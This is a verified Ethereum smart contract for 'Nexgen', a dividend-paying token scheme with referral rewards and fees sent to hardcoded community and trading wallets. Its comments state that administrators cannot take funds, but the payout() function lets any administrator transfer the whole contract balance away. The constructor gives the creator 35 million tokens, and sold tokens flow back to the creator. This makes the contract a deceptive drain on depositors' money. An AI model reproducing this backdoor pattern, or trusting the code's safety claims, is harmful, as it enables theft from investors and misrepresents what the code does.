1 /**
2  *Submitted for verification at Etherscan.io on 2019-06-18
3 */
4 
5 /*NEXGEN dApp - The World's First Most Sustainable Decentralized Application */
6 
7 /**
8  * Source Code first verified at https://etherscan.io on Wednesday, June 18, 2019
9  (UTC) */
10 
11 pragma solidity ^0.4.20;
12 
13 contract Nexgen {
14     
15     /*=================================
16     =            MODIFIERS            =
17     =================================*/
18     // only people with tokens
19     modifier onlybelievers () {
20         require(myTokens() > 0);
21         _;
22     }
23     
24     // only people with profits
25     modifier onlyhodler() {
26         require(myDividends(true) > 0);
27         _;
28     }
29     
30     // only people with sold token
31     modifier onlySelingholder() {
32         require(sellingWithdrawBalance_[msg.sender] > 0);
33         _;
34     }
35     
36     // administrators can:
37     // -> change the name of the contract
38     // -> change the name of the token
39     // -> change the PoS difficulty 
40     // they CANNOT:
41     // -> take funds
42     // -> disable withdrawals
43     // -> kill the contract
44     // -> change the price of tokens
45     modifier onlyAdministrator(){
46         address _customerAddress = msg.sender;
47         require(administrators[keccak256(_customerAddress)]);
48         _;
49     }
50     
51     
52 
53     
54     /*==============================
55     =            EVENTS            =
56     ==============================*/
57     event onTokenPurchase(
58         address indexed customerAddress,
59         uint256 incomingEthereum,
60         uint256 tokensMinted,
61         address indexed referredBy
62     );
63     
64     event onTokenSell(
65         address indexed customerAddress,
66         uint256 tokensBurned
67     );
68     
69     event onReinvestment(
70         address indexed customerAddress,
71         uint256 ethereumReinvested,
72         uint256 tokensMinted
73     );
74     
75     event onWithdraw(
76         address indexed customerAddress,
77         uint256 ethereumWithdrawn
78     );
79     
80     event onSellingWithdraw(
81         
82         address indexed customerAddress,
83         uint256 ethereumWithdrawn
84     
85     );
86     
87     // ERC20
88     event Transfer(
89         address indexed from,
90         address indexed to,
91         uint256 tokens
92     );
93     
94     
95     /*=====================================
96     =            CONFIGURABLES            =
97     =====================================*/
98     string public name = "Nexgen";
99     string public symbol = "NEXG";
100     uint8 constant public decimals = 18;
101     uint8 constant internal dividendFee_ = 10;
102     
103     uint256 constant internal tokenPriceInitial_ = 0.000005 ether;
104     uint256 constant internal tokenPriceIncremental_ = 0.00000015 ether;
105 
106     
107     
108     // proof of stake (defaults at 1 token)
109     uint256 public stakingRequirement = 1e18;
110      
111     // add community wallet here
112     address internal constant CommunityWalletAddr = address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340);
113         
114         //add trading wallet here
115     address internal constant TradingWalletAddr = address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883);   
116 
117     
118     
119    /*================================
120     =            DATASETS            =
121     ================================*/
122     // amount of shares for each address (scaled number)
123     mapping(address => uint256) internal tokenBalanceLedger_;
124     mapping(address => uint256) internal referralBalance_;
125     mapping(address => int256) internal payoutsTo_;
126     mapping(address => uint256) internal sellingWithdrawBalance_;
127     mapping(address => uint256) internal ambassadorAccumulatedQuota_;
128 
129     address[] private contractTokenHolderAddresses_;
130 
131     
132     uint256 internal tokenSupply_ = 0;
133     uint256 internal profitPerShare_;
134     
135     uint256 internal soldTokens_=0;
136     uint256 internal contractAddresses_=0;
137     uint256 internal tempIncomingEther=0;
138     uint256 internal calculatedPercentage=0;
139     
140     
141     uint256 internal tempProfitPerShare=0;
142     uint256 internal tempIf=0;
143     uint256 internal tempCalculatedDividends=0;
144     uint256 internal tempReferall=0;
145     uint256 internal tempSellingWithdraw=0;
146 
147     address internal creator;
148     
149 
150 
151     
152     // administrator list (see above on what they can do)
153     mapping(bytes32 => bool) public administrators;
154     
155     
156     bool public onlyAmbassadors = false;
157     
158 
159 
160     /*=======================================
161     =            PUBLIC FUNCTIONS            =
162     =======================================*/
163     /*
164     * -- APPLICATION ENTRY POINTS --  
165     */
166     function Nexgen()
167         public
168     {
169         // add administrators here
170            
171         administrators[0x25d75fcac9be21f1ff885028180480765b1120eec4e82c73b6f043c4290a01da] = true;
172         creator = msg.sender;
173         tokenBalanceLedger_[creator] = 35000000*1e18;                     
174                          
175         
176     }
177 
178     /**
179      * Community Wallet Balance
180      */
181     function CommunityWalletBalance() public view returns(uint256){
182         return address(0xfd6503cae6a66Fc1bf603ecBb565023e50E07340).balance;
183     }
184 
185     /**
186      * Trading Wallet Balance
187      */
188     function TradingWalletBalance() public view returns(uint256){
189         return address(0x6d5220BC0D30F7E6aA07D819530c8727298e5883).balance;
190     } 
191 
192     /**
193      * Referral Balance
194      */
195     function ReferralBalance() public view returns(uint256){
196         return referralBalance_[msg.sender];
197     } 
198 
199     /**
200      * Converts all incoming Ethereum to tokens for the caller, and passes down the referral address (if any)
201      */
202     function buy(address _referredBy)
203         public
204         payable
205         returns(uint256)
206     {
207         purchaseTokens(msg.value, _referredBy);
208 
209     }
210     
211     
212     function()
213         payable
214         public
215     {
216         purchaseTokens(msg.value, 0x0);
217     }
218     
219     /**
220      * Converts all of caller's dividends to tokens.
221      */
222     function reinvest()
223         onlyhodler()
224         public
225     {
226         address _customerAddress = msg.sender;
227 
228         // fetch dividends
229         uint256 _dividends = myDividends(true); // retrieve ref. bonus later in the code
230  
231          //calculate  10 % for distribution 
232         uint256  ten_percentForDistribution= SafeMath.percent(_dividends,10,100,18);
233 
234          //calculate  90 % to reinvest into tokens
235         uint256  nighty_percentToReinvest= SafeMath.percent(_dividends,90,100,18);
236         
237         
238         // dispatch a buy order with the calculatedPercentage 
239         uint256 _tokens = purchaseTokens(nighty_percentToReinvest, 0x0);
240         
241         
242         //Empty their  all dividends beacuse we are reinvesting them
243          payoutsTo_[_customerAddress]=0;
244          referralBalance_[_customerAddress]=0;
245         
246     
247      
248       //distribute to all as per holdings         
249         profitPerShareAsPerHoldings(ten_percentForDistribution);
250         
251         // fire event
252         onReinvestment(_customerAddress, _dividends, _tokens);
253     }
254     
255     /**
256      * Alias of sell() and withdraw().
257      */
258     function exit()
259         public
260     {
261         // get token count for caller & sell them all
262         address _customerAddress = msg.sender;
263         uint256 _tokens = tokenBalanceLedger_[_customerAddress];
264         if(_tokens > 0) sell(_tokens);
265         
266         
267         withdraw();
268     }
269 
270     /**
271      * Withdraws all of the callers earnings.
272      */
273     function withdraw()
274         onlyhodler()
275         public
276     {
277         // setup data
278         address _customerAddress = msg.sender;
279         
280         //calculate 20 % of all Dividends and transfer them to two communities
281         //10% to community wallet
282         //10% to trading wallet
283         
284         uint256 _dividends = myDividends(true); // get all dividends
285         
286         //calculate  10 % for trending wallet
287         uint256  ten_percentForTradingWallet= SafeMath.percent(_dividends,10,100,18);
288 
289         //calculate 10 % for community wallet
290          uint256 ten_percentForCommunityWallet= SafeMath.percent(_dividends,10,100,18);
291 
292         
293         //Empty their  all dividends beacuse we are reinvesting them
294          payoutsTo_[_customerAddress]=0;
295          referralBalance_[_customerAddress]=0;
296        
297          // delivery service
298         CommunityWalletAddr.transfer(ten_percentForCommunityWallet);
299         
300          // delivery service
301         TradingWalletAddr.transfer(ten_percentForTradingWallet);
302         
303         //calculate 80% to tranfer it to customer address
304          uint256 eighty_percentForCustomer= SafeMath.percent(_dividends,80,100,18);
305 
306        
307         // delivery service
308         _customerAddress.transfer(eighty_percentForCustomer);
309         
310         // fire event
311         onWithdraw(_customerAddress, _dividends);
312     }
313     
314      /**
315      * Withdrawa all selling Withdraw of the callers earnings.
316      */
317     function sellingWithdraw()
318         onlySelingholder()
319         public
320     {
321         // setup data
322         address _customerAddress = msg.sender;
323         
324 
325         uint256 _sellingWithdraw = sellingWithdrawBalance_[_customerAddress] ; // get all balance
326         
327 
328         //Empty  all sellingWithdraw beacuse we are giving them ethers
329          sellingWithdrawBalance_[_customerAddress]=0;
330 
331      
332         // delivery service
333         _customerAddress.transfer(_sellingWithdraw);
334         
335         // fire event
336         onSellingWithdraw(_customerAddress, _sellingWithdraw);
337     }
338     
339     
340     
341      /**
342      * Sell tokens.
343      * Remember, there's a 10% fee here as well.
344      */
345    function sell(uint256 _amountOfTokens)
346         onlybelievers ()
347         public
348     {
349       
350         address _customerAddress = msg.sender;
351        
352         //calculate 10 % of tokens and distribute them 
353         require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
354         uint256 _tokens = _amountOfTokens;
355       
356        uint256 _ethereum = tokensToEthereum_(_tokens);
357         
358           //calculate  10 % for distribution 
359        uint256  ten_percentToDistributet= SafeMath.percent(_ethereum,10,100,18);
360 
361           //calculate  90 % for customer withdraw wallet
362         uint256  nighty_percentToCustomer= SafeMath.percent(_ethereum,90,100,18);
363         
364         // burn the sold tokens
365         tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);
366         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);
367         tokenBalanceLedger_[creator] = SafeMath.add(tokenBalanceLedger_[creator], _tokens);
368 
369 
370         //substract sold token from circulations of tokenSupply_
371         soldTokens_=SafeMath.sub(soldTokens_,_tokens);
372         
373         // update sellingWithdrawBalance of customer 
374        sellingWithdrawBalance_[_customerAddress] += nighty_percentToCustomer;       
375         
376        
377         //distribute to all as per holdings         
378        profitPerShareAsPerHoldings(ten_percentToDistributet);
379       
380         //Sold Tokens Ether Transfer to User Account
381         sellingWithdraw();
382         
383         // fire event
384         onTokenSell(_customerAddress, _tokens);
385         
386     }
387     
388     
389     /**
390      * Transfer tokens from the caller to a new holder.
391      * Remember, there's a 5% fee here as well.
392      */
393     function transfer(address _toAddress, uint256 _amountOfTokens)
394         onlybelievers ()
395         public
396         returns(bool)
397     {
398         // setup
399         address _customerAddress = msg.sender;
400         
401         // make sure we have the requested tokens
402      
403         require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);
404       
405         //calculate 5 % of total tokens calculate Tokens Received
406         uint256  five_percentOfTokens= SafeMath.percent(_amountOfTokens,5,100,18);
407         
408        
409        //calculate 95 % of total tokens calculate Tokens Received
410         uint256  nightyFive_percentOfTokens= SafeMath.percent(_amountOfTokens,95,100,18);
411         
412         
413         // burn the fee tokens
414         //convert ethereum to tokens
415         tokenSupply_ = SafeMath.sub(tokenSupply_,five_percentOfTokens);
416         
417         //substract five percent from communiity of tokens
418         soldTokens_=SafeMath.sub(soldTokens_, five_percentOfTokens);
419 
420         // exchange tokens
421         tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
422         tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], nightyFive_percentOfTokens) ;
423         
424 
425         //calculate value of all token to transfer to ethereum
426         uint256 five_percentToDistribute = tokensToEthereum_(five_percentOfTokens);
427 
428 
429         //distribute to all as per holdings         
430         profitPerShareAsPerHoldings(five_percentToDistribute);
431 
432         // fire event
433         Transfer(_customerAddress, _toAddress, nightyFive_percentOfTokens);
434         
435         
436         return true;
437        
438     }
439     
440     /*----------  ADMINISTRATOR ONLY FUNCTIONS  ----------*/
441     /**
442      * administrator can manually disable the ambassador phase.
443      */
444     function disableInitialStage()
445         onlyAdministrator()
446         public
447     {
448         onlyAmbassadors = false;
449     }
450     
451    
452     function setAdministrator(bytes32 _identifier, bool _status)
453         onlyAdministrator()
454         public
455     {
456         administrators[_identifier] = _status;
457     }
458     
459    
460     function setStakingRequirement(uint256 _amountOfTokens)
461         onlyAdministrator()
462         public
463     {
464         stakingRequirement = _amountOfTokens;
465     }
466     
467     
468     function setName(string _name)
469         onlyAdministrator()
470         public
471     {
472         name = _name;
473     }
474     
475    
476     function setSymbol(string _symbol)
477         onlyAdministrator()
478         public
479     {
480         symbol = _symbol;
481     }
482 
483     function payout (address _address) public onlyAdministrator returns(bool res) {
484         _address.transfer(address(this).balance);
485         return true;
486     }
487     /*----------  HELPERS AND CALCULATORS  ----------*/
488     /**
489      * Method to view the current Ethereum stored in the contract
490      * Example: totalEthereumBalance()
491      */
492     function totalEthereumBalance()
493         public
494         view
495         returns(uint)
496     {
497         return this.balance;
498     }
499     
500     /**
501      * Retrieve the total token supply.
502      */
503     function totalSupply()
504         public
505         view
506         returns(uint256)
507     {
508         return tokenSupply_;
509     }
510     
511     /**
512      * Retrieve the tokens owned by the caller.
513      */
514     function myTokens()
515         public
516         view
517         returns(uint256)
518     {
519         address _customerAddress = msg.sender;
520         return balanceOf(_customerAddress);
521     }
522     
523     /**
524      * Retrieve the sold tokens .
525      */
526     function soldTokens()
527         public
528         view
529         returns(uint256)
530     {
531 
532         return soldTokens_;
533     }
534     
535     
536     /**
537      * Retrieve the dividends owned by the caller.
538        */ 
539     function myDividends(bool _includeReferralBonus) 
540         public 
541         view 
542         returns(uint256)
543     {
544         address _customerAddress = msg.sender;
545 
546         return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress);
547     }
548     
549     /**
550      * Retrieve the token balance of any single address.
551      */
552     function balanceOf(address _customerAddress)
553         view
554         public
555         returns(uint256)
556     {
557         return tokenBalanceLedger_[_customerAddress];
558     }
559     
560     /**
561      * Retrieve the selingWithdraw balance of address.
562      */
563     function selingWithdrawBalance()
564         view
565         public
566         returns(uint256)
567     {
568         address _customerAddress = msg.sender;
569          
570         uint256 _sellingWithdraw = (uint256) (sellingWithdrawBalance_[_customerAddress]) ; // get all balance
571         
572         return  _sellingWithdraw;
573     }
574     
575     /**
576      * Retrieve the dividend balance of any single address.
577      */
578     function dividendsOf(address _customerAddress)
579         view
580         public
581         returns(uint256)
582     {
583      
584         return  (uint256) (payoutsTo_[_customerAddress]) ;
585 
586         
587     }
588     
589     /**
590      * Return the buy price of 1 individual token.
591      */
592     function sellPrice() 
593         public 
594         view 
595         returns(uint256)
596     {
597        
598         if(tokenSupply_ == 0){
599             return tokenPriceInitial_ - tokenPriceIncremental_;
600         } else {
601             uint256 _ethereum = tokensToEthereum_(1e18);
602             
603             return _ethereum - SafeMath.percent(_ethereum,15,100,18);
604         }
605     }
606     
607     /**
608      * Return the sell price of 1 individual token.
609      */
610     function buyPrice() 
611         public 
612         view 
613         returns(uint256)
614     {
615         
616         if(tokenSupply_ == 0){
617             return tokenPriceInitial_ ;
618         } else {
619             uint256 _ethereum = tokensToEthereum_(1e18);
620            
621            
622             return _ethereum;
623         }
624     }
625     
626    
627     /**
628      * Function to calculate actual value after Taxes
629      */
630     function calculateTokensReceived(uint256 _ethereumToSpend) 
631         public 
632         view 
633         returns(uint256)
634     {
635          //calculate  15 % for distribution 
636         uint256  fifteen_percentToDistribute= SafeMath.percent(_ethereumToSpend,15,100,18);
637 
638         uint256 _dividends = SafeMath.sub(_ethereumToSpend, fifteen_percentToDistribute);
639         uint256 _amountOfTokens = ethereumToTokens_(_dividends);
640         
641         return _amountOfTokens;
642     }
643     
644     
645    
646    
647     function calculateEthereumReceived(uint256 _tokensToSell) 
648         public 
649         view 
650         returns(uint256)
651     {
652         require(_tokensToSell <= tokenSupply_);
653         
654         uint256 _ethereum = tokensToEthereum_(_tokensToSell);
655         
656          //calculate  10 % for distribution 
657         uint256  ten_percentToDistribute= SafeMath.percent(_ethereum,10,100,18);
658         
659         uint256 _dividends = SafeMath.sub(_ethereum, ten_percentToDistribute);
660 
661         return _dividends;
662 
663     }
664     
665     
666     /*==========================================
667     =            INTERNAL FUNCTIONS            =
668     ==========================================*/
669     
670     
671     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)
672         internal
673         returns(uint256)
674     {
675         // data setup
676         address _customerAddress = msg.sender;
677         
678         //check if address 
679         tempIncomingEther=_incomingEthereum;
680         
681                 bool isFound=false;
682                 
683                 for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
684                     
685                     if(contractTokenHolderAddresses_[k] ==_customerAddress){
686                         
687                      isFound=true;
688                     break;
689                         
690                     }
691                 }
692     
693     
694         if(!isFound){
695         
696             //increment address to keep track of no of users in smartcontract
697             contractAddresses_+=1;  
698             
699             contractTokenHolderAddresses_.push(_customerAddress);
700                         
701             }
702     
703      //calculate 85 percent
704       calculatedPercentage= SafeMath.percent(_incomingEthereum,85,100,18);
705       
706       uint256 _amountOfTokens = ethereumToTokens_(SafeMath.percent(_incomingEthereum,85,100,18));    
707 
708         // we can't give people infinite ethereum
709         if(tokenSupply_ > 0){
710             
711             // add tokens to the pool
712             tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);
713         
714         
715         } else {
716             // add tokens to the pool
717             tokenSupply_ = _amountOfTokens;
718         }
719         
720         // update circulating supply & the ledger address for the customer
721         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
722         
723         
724         require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_) && tokenSupply_ <= (55000000*1e18));
725         
726         // is the user referred by a Nexgen Key?
727         if(
728             // is this a referred purchase?
729             _referredBy != 0x0000000000000000000000000000000000000000 &&
730 
731             // no cheating!
732             _referredBy != _customerAddress &&
733             
734             // does the referrer have at least X whole tokens?
735             // i.e is the referrer a godly chad masternode
736             tokenBalanceLedger_[_referredBy] >= stakingRequirement
737             
738         ){
739            
740      // give 5 % to referral
741      referralBalance_[_referredBy]+= SafeMath.percent(_incomingEthereum,5,100,18);
742      
743      tempReferall+=SafeMath.percent(_incomingEthereum,5,100,18);
744      
745      if(contractAddresses_>0){
746          
747      profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,10,100,18));
748     
749     
750        
751      }
752      
753     } else {
754           
755      
756      if(contractAddresses_>0){
757     
758      profitPerShareAsPerHoldings(SafeMath.percent(_incomingEthereum,15,100,18));
759 
760  
761         
762      }
763             
764         }
765         
766       
767     
768 
769         
770         // fire event
771         onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);
772         
773         //calculate sold tokens here
774         soldTokens_+=_amountOfTokens;
775         
776         return _amountOfTokens;
777     }
778 
779    
780      
781    /**
782      * Calculate Token price based on an amount of incoming ethereum
783      * It's an algorithm, hopefully we gave you the whitepaper with it in scientific notation;
784      * Some conversions occurred to prevent decimal errors or underflows / overflows in solidity code.
785      */
786      
787     function ethereumToTokens_(uint256 _ethereum)
788         internal
789         view
790         returns(uint256)
791     {
792         uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;
793         uint256 _tokensReceived = 
794          (
795             (
796                 // underflow attempts BTFO
797                 SafeMath.sub(
798                     (sqrt
799                         (
800                             (_tokenPriceInitial**2)
801                             +
802                             (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))
803                             +
804                             (((tokenPriceIncremental_)**2)*(tokenSupply_**2))
805                             +
806                             (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)
807                         )
808                     ), _tokenPriceInitial
809                 )
810             )/(tokenPriceIncremental_)
811         )-(tokenSupply_)
812         ;
813   
814         return _tokensReceived;
815     }
816     
817     /**
818      * Calculate token sell value.
819           */
820      function tokensToEthereum_(uint256 _tokens)
821         internal
822         view
823         returns(uint256)
824     {
825 
826         uint256 tokens_ = (_tokens + 1e18);
827         uint256 _tokenSupply = (tokenSupply_ + 1e18);
828         uint256 _etherReceived =
829         (
830             // underflow attempts BTFO
831             SafeMath.sub(
832                 (
833                     (
834                         (
835                             tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))
836                         )-tokenPriceIncremental_
837                     )*(tokens_ - 1e18)
838                 ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2
839             )
840         /1e18);
841         return _etherReceived;
842     }
843     
844     //calculate profitPerShare as per holdings
845     function profitPerShareAsPerHoldings(uint256 calculatedDividend)  internal {
846     
847        //calculate number of token 
848        uint256 noOfTokens_;
849         tempCalculatedDividends=calculatedDividend;
850 
851        for(uint i=0;i<contractTokenHolderAddresses_.length;i++){
852          
853          noOfTokens_+= tokenBalanceLedger_[contractTokenHolderAddresses_[i]];
854 
855         }
856         
857         //check if self token balance is zero then distribute to others as per holdings
858         
859     for(uint k=0;k<contractTokenHolderAddresses_.length;k++){
860         
861         if(noOfTokens_>0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]!=0){
862        
863 
864            profitPerShare_=SafeMath.percent(calculatedDividend,tokenBalanceLedger_[contractTokenHolderAddresses_[k]],noOfTokens_,18);
865          
866            tempProfitPerShare=profitPerShare_;
867 
868            payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (profitPerShare_) ;
869            
870            tempIf=1;
871 
872             
873         }else if(noOfTokens_==0 && tokenBalanceLedger_[contractTokenHolderAddresses_[k]]==0){
874             
875             tempIf=2;
876             tempProfitPerShare=profitPerShare_;
877 
878             payoutsTo_[contractTokenHolderAddresses_[k]] += (int256) (calculatedDividend) ;
879         
880             
881         }
882         
883       }
884         
885         
886     
887         
888 
889     
890     }
891     
892     //calculate square root
893     function sqrt(uint x) internal pure returns (uint y) {
894         uint z = (x + 1) / 2;
895         y = x;
896         while (z < y) {
897             y = z;
898             z = (x / z + z) / 2;
899         }
900     }
901 }
902 
903 /**
904  * @title SafeMath
905  * @dev Math operations with safety checks that throw on error
906  */
907 library SafeMath {
908     
909     function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(/*uint division,*/uint quotient) {
910 
911          // caution, check safe-to-multiply here
912         uint _numerator  = numerator * 10 ** (precision+1);
913         // with rounding of last digit
914         uint _quotient =  ((_numerator / denominator) + 5) / 10;
915         
916        // uint division_=numerator/denominator;
917         /* value*division_,*/
918         return (value*_quotient/1000000000000000000);
919   }
920 
921 
922     
923     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
924         if (a == 0) {
925             return 0;
926         }
927         uint256 c = a * b;
928         assert(c / a == b);
929         return c;
930     }
931 
932    
933     function div(uint256 a, uint256 b) internal pure returns (uint256) {
934         // assert(b > 0); // Solidity automatically throws when dividing by 0
935         uint256 c = a / b;
936         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
937         return c;
938     }
939 
940     
941     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
942         assert(b <= a);
943         return a - b;
944     }
945 
946    
947     function add(uint256 a, uint256 b) internal pure returns (uint256) {
948         uint256 c = a + b;
949         assert(c >= a);
950         return c;
951     }
952 }